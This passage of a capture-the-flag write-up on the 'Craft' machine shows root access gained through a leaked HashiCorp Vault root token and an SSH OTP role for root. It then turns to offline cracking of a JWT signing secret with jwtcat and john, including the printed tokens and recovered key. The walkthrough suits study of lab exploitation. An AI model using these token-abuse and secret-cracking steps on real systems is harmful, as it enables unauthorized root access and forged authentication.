-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9 22:41 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9 03:14 .config
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8 21:52 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9 22:41 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Feb  9 22:46 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9 00:26 .vault-token
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9 22:38 .viminfo

gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

```

There’s also a `vault` binary:

```

gilfoyle@craft:~$ which vault
/usr/local/bin/vault

```

This all has to do with the [Vault Project](https://www.vaultproject.io/), a system that claims to:

> Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API.

### Enumerate Gogs

There’s a bunch of interesting stuff in the Gogs `craft-infra` private repo beyond the ssh key. The `docker-compose.yml` file gives the layout of how all the containers are configured for the host:

```

    version: '3'
    services:
      db:
        image: mysql
        expose:
          - "3306"
        volumes:
          - /opt/storage/mysql:/var/lib/mysql
      repo:
        image: gogs/gogs
        expose:
          - "6022"
          - "3000"
        ports:
          - 6022:6022
        volumes:
          - /opt/storage/gogs:/data
      home:
        image: craft-flask:master
        volumes:
          - /opt/storage/craft-home/:/opt/app
        expose:
          - "8888"
        command: [python, ./app.py]
      api: 
        image: craft-flask:master
        volumes:
          - /opt/storage/craft-api/:/opt/app
        expose:
          - "8888"
        command: [python, ./app.py]  
      proxy:
        image: nginx:latest
        volumes:
          - /opt/storage/nginx/conf/nginx.conf:/etc/nginx/nginx.conf
          - /opt/storage/nginx/pki/:/etc/nginx/pki/
        ports:
          - 80:80
          - 443:443
      vault:
        image: craft-vault:master
        volumes:
          - /opt/storage/vault/config:/vault/config
          - /opt/storage/vault/pki:/vault/pki
          - /opt/storage/vault/log:/vault/logs
          - /opt/storage/vault/data:/vault/data
        expose:
          - "8200"
        entrypoint: vault server -config /vault/config/config.hcl
        privileged: true

```

The `nginx` config shows how http traffic is routed, the sql config shows how the db is initialized, etc.

But the most interesting is the `vault` folder. It has three files:

![1563398696738](https://0xdfimages.gitlab.io/img/1563398696738.png)

The `Dockerfile` defines the container, but isn’t that interesting. The `config.hcl` file also contains vault config data, but isn’t that interesting.

The `secrets.sh` file is interesting:

```

#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0

```

When I first came across this file, I didn’t really appreciate what it was doing. But once I spent some time enumerating the vault, it became clear, and then I was able to root the box almost immediately.

### Enumerate Vault

I started working through the [Vault Command Line Documentation](https://www.vaultproject.io/docs/commands/index.html) to get a feel for how it works.

[token/lookup](https://www.vaultproject.io/docs/commands/token/lookup.html) say it will give information about the currently logged in user:

```

gilfoyle@craft:~$ vault token lookup
Key                 Value
---                 -----
accessor            1dd7b9a1-f0f1-f230-dc76-46970deb5103
creation_time       1549678834
creation_ttl        0s
display_name        root
entity_id           n/a
expire_time         <nil>
explicit_max_ttl    0s
id                  f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
meta                <nil>
num_uses            0
orphan              true
path                auth/token/root
policies            [root]
ttl                 0

```

Without understanding all the detail, it looks like id matches what I saw in the `.vault-token` file earlier.

[status](https://www.vaultproject.io/docs/commands/status.html) gives information about the current cluster:

```

gilfoyle@craft:~$ vault status
Key             Value
---             -----
Seal Type       shamir
Initialized     false
Sealed          false
Total Shares    5
Threshold       3
Version         0.11.1
Cluster Name    vault-cluster-cb7e66f9
Cluster ID      8bb98351-0148-3c42-d124-45a87dc43db7
HA Enabled      false

```

[list](https://www.vaultproject.io/docs/commands/list.html) seemed useful, but I didn’t know the name of any stores to query. [secrets/list](https://www.vaultproject.io/docs/commands/secrets/list.html) seems to give me some paths to try:

```

gilfoyle@craft:~$ vault secrets list
Path          Type         Accessor              Description
----          ----         --------              -----------
cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage
identity/     identity     identity_56533c34     identity store
secret/       kv           kv_2d9b0109           key/value secret storage
ssh/          ssh          ssh_3bbd5276          n/a
sys/          system       system_477ec595       system endpoints used for control, policy and debugging

```

But they all seem empty, trying with both list and read:

```

gilfoyle@craft:~$ vault list cubbyhole/
No value found at cubbyhole/
gilfoyle@craft:~$ vault list identity/
No value found at identity/
gilfoyle@craft:~$ vault list secret/
No value found at secret/
gilfoyle@craft:~$ vault list ssh/
No value found at ssh/
gilfoyle@craft:~$ vault list sys/
No value found at sys/

```

### SSH

Then I remembered the [ssh](https://www.vaultproject.io/docs/commands/ssh.html) command, and remembered the `sh` script from Gogs that runs `vault secrets enable ssh` and `vault write ssh/roles/root_otp key_type=otp default_user=root cidr_list=0.0.0.0/0`.

I can read that value out:

```

gilfoyle@craft:~$ vault read ssh/roles/root_otp
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22

```

But more importantly, I can use the ssh command to connect:

```

gilfoyle@craft:~$ vault ssh -mode=otp -role=root_otp root@127.0.0.1
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 6c5f8635-d25a-958e-078b-e929255b949d

  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/

Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 16 01:52:13 2019 from 127.0.0.1
root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)

```

From there I can grab `root.txt`:

```

root@craft:~# cat root.txt
831d64ef************************

```

## Beyond Root - JWT

### JWT Overview

I’ve looked at JWTs [before](/tags.html#jwt). They are basically broken into three parts, each base64-encoded, and separated by `.`. [jwt.io](https://jwt.io/) shows this nicely:

![image-20200102070952772](https://0xdfimages.gitlab.io/img/image-20200102070952772.png)

I can show the header decodes to the same thing I see on the website:

```

root@kali# echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
{"typ":"JWT","alg":"HS256"}

```

The header defines the algorithm and type, and the verification signature ensures that only something with the secret can sign the token. The data is whatever the author wants it to be.

### Cracking Secret

Because the algorithm is well known, and the data is all in an attackers hands, JWTs are vulnerable to offline brute force attacks, so the secret should be long and random to present cracking.

I went down a rabbit hole trying to break the secret for Craft. It turns out there is a strong enough secret that I didn’t break it.

I played with a tool called [jwtcat](https://github.com/aress31/jwtcat), but it failed to break the JWT using rockyou:

```

root@kali:/opt/jwtcat# python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw -w /usr/share/wordlists/rockyou.txt
[INFO] JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw
[INFO] Wordlist: /usr/share/wordlists/rockyou.txt
[INFO] Starting brute-force attacks
jwtcat.py:110: DeprecationWarning: The 'warn' method is deprecated, use 'warning' instead
  logger.warn("Pour yourself some coffee, this might take a while..." )
[WARNING] Pour yourself some coffee, this might take a while...   
[INFO] Finished in 1010.7418391704559 sec

```

Turns out `john` supports JWTs (though it also fails to crack with rockyou):

```

root@kali# cat jwt 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTcyMjYwfQ.S5iVA7qtkjx4C0avPU2BvbOMcL0obW-mOB85IAgHnGw
root@kali# john --wordlist=/usr/share/wordlists/rockyou.txt jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

```

When I get a shell on the box and find the secret, I can show that if the secret were in the wordlist, it would have broken with `john`:

```

root@kali# cat api_key 
hz66OCkDtv8G6D

root@kali# cat jwt 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTcyMjYwfQ.S5iVA7qtkjx4C0avPU2BvbOMcL0obW-mOB85IAgHnGw

root@kali# john --wordlist=api_key jwt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidates left, minimum 24 needed for performance.
hz66OCkDtv8G6D   (?)
1g 0:00:00:00 DONE (2019-07-15 13:10) 33.33g/s 33.33p/s 33.33c/s 33.33C/s hz66OCkDtv8G6D
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

With this key, I can create new JWTs that say whatever I want, and this API will trust them.